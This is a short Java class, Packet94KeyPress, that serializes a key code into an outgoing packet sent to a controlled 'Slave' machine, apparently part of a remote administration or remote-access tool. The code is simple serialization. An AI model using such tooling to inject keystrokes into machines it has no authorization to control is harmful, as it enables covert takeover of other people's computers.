package com.redpois0n.packets.outgoing;

import java.io.DataOutputStream;

import com.redpois0n.Slave;

public class Packet94KeyPress extends AbstractOutgoingPacket {
	
	private int keyCode;
	
	public Packet94KeyPress(int keyCode) {
		this.keyCode = keyCode;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(keyCode);
	}

	@Override
	public byte getPacketId() {
		return 94;
	}

}
